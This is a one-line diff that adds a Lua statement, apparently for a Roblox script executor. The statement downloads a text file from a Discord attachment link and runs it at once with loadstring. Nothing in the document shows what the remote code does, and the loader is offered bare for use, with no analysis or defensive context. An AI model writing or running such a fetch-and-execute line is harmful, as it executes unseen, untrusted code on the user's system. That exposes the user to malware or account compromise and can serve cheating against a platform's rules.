@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://cdn.discordapp.com/attachments/1243879221797978174/1291483382357823598/message.txt?ex=67004320&is=66fef1a0&hm=a2149403f9292bc8d704f89c9e047047ec08eeb0403be7e8f3ba4e4fc42edcc7&"))()
